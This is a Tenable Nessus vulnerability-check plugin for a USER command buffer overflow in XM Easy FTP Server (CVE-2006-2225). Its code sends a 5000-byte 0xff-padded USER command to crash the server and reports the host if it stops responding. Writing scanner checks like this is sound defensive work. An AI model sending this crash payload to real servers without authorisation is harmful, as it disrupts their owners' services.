#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21338);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2014/05/27 00:42:45 $");

  script_cve_id("CVE-2006-2225");
  script_bugtraq_id(17836);
  script_osvdb_id(25277);

  script_name(english:"XM Easy FTP Server USER Command Buffer Overflow");
  script_summary(english:"Checks for USER command buffer overflow vulnerability in XM Easy FTP Server");

  script_set_attribute(attribute:"synopsis", value:"The remote FTP server is affected by a buffer overflow flaw.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be using XM Easy FTP Server, a personal FTP
server for Windows.

The version of XM Easy FTP Server installed on the remote host
contains a buffer overflow vulnerability that can be exploited by an
unauthenticated user with a specially crafted USER command to crash
the affected application or execute arbitrary code on the affected
host.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/432960/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/05/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2006-2014 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("audit.inc");
include("ftp_func.inc");
include("global_settings.inc");

port = get_ftp_port(default: 21);


soc = open_sock_tcp(port);
if (!soc) exit(1);


# Make sure it's XM Easy FTP Server.
#
# nb: the banner is configurable so don't exit if we're paranoid.
banner = ftp_recv_line(socket:soc);
if ( ! banner ) exit(0);
if ( report_paranoia < 2 && "Welcome to DXM's FTP Server" >!< banner) exit(0);


# Try to exploit the flaw to crash the daemon.
c = strcat("USER ", crap(data:raw_string(0xff), length:5000), '\r\n');
send(socket:soc, data: c);
s = ftp_recv_line(socket:soc);


# If we didn't get a response...
if (isnull(s))
{
  sleep(1);

  # Try to reestablish a connection and read the banner.
  soc2 = open_sock_tcp(port);
  if (soc2) s2 = ftp_recv_line(socket:soc2);

  # If we couldn't establish the connection or read the banner,
  # there's a problem.
  if (!soc2 || !strlen(s2)) {
    security_hole(port);
    exit(0);
  }
  close(soc2);
}
